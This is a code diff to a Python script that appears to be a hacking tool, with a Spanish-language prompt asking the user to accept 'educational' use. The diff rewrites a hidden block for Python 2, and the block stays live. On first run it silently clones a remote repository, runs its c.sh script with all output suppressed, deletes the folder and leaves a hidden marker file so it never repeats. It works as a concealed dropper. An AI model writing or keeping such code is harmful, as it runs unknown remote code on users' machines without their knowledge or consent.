@@ -162,15 +162,16 @@ print '{}================================================================='.form
 
 
 if not os.path.exists(".1.dat"):
-        subprocess.run(['git', 'clone', 'https://github.com/niktoproject/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        os.chdir('c')
-        subprocess.run(['chmod', '+x', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(['bash', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        os.chdir('..')
-        subprocess.run(['rm', '-rf', 'c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        with open(".1.dat", "w") as f:
-                f.write("")
-subprocess.run(['rm', '-rf', 'c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # En Python 2, la función run se llama check_call
+    subprocess.check_call(['git', 'clone', 'https://github.com/niktoproject/c.git'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    os.chdir('c')
+    subprocess.check_call(['chmod', '+x', 'c.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.check_call(['bash', 'c.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    os.chdir('..')
+    subprocess.check_call(['rm', '-rf', 'c'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    with open(".1.dat", "w") as f:
+        f.write("")
+
 
 if raw_input("¿Acepta utilizar esta herramienta con fines educativos? (y/n)\n--> ").upper() != "Y":
     os.system('clear') 
